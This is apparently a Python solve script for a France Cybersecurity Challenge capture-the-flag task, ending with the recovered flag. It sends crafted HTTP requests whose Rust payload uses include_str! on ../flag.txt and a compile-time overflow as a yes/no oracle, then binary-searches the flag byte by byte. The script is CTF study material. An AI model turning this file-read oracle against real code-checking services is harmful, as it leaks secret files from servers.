import socket


debut_json = '{"content":"'
payload1 = "fn main() {const WHATEVER: usize = (std::include_str!(\\\"../flag.txt\\\").as_bytes()["
payload2 = "] as usize()) - "
payload3 = " - 1;}"
fin_json = '"}'

base_request1 = """POST /check HTTP/1.1
Host: challenges2.france-cybersecurity-challenge.fr:6005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr-FR,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: """

base_request2 = """
Origin: http://challenges2.france-cybersecurity-challenge.fr:6005
DNT: 1
Connection: close
Referer: http://challenges2.france-cybersecurity-challenge.fr:6005/

"""


def isSuperieur(indice, comparateur):
    ret=False
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("challenges2.france-cybersecurity-challenge.fr", 6005))
    commandeFinale = debut_json+payload1+str(indice)+payload2+str(comparateur)+payload3+fin_json
    
    requestFinale = base_request1 + str(len(commandeFinale)) + base_request2 + commandeFinale
    # print(requestFinale)
    
    s.send(requestFinale.encode())
    response = s.recv(4096)
    response = response.decode("utf-8")
    print(response[-3])
    if response[-3] == "0" :
        ret=True
    return ret
    
length = 75
mdp = ""
i = len(mdp)

while i<length :
    a = 0
    b = 255
    while (b - a) > 1:
        c = (b + a) // 2
        if isSuperieur(i, c):
            a = c
        else:
            b = c
    
    mdp += chr(a+1)
        
    print(mdp)
    i+=1

# flag : FCSC{a35036487430b24da38b43e1369f56e69a25bd39e594cd1e7ff3e97b62b3c638}